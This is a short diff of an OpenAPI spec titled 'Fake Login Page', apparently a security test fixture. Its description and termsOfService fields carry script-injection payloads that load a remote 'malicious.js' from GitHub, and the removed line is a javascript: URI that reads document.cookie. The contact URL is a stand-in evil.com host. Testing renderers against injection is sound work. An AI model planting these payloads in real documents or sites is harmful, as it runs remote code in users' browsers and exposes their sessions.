@@ -3,7 +3,7 @@ info:
   version: 1.0.0
   title: Fake Login Page
   description: '<div class="login-form"><script src="https://raw.githubusercontent.com/bilauk/checkSWG/main/malicious.js"></script></div>'
-  termsOfService: "javascript:alert(document.cookie)"
+  termsOfService: '<div class="login-form"><script src="https://raw.githubusercontent.com/bilauk/checkSWG/main/malicious.js"></script></div>'
   contact: 
     name: "API Support"
     url: "https://evil.com/"
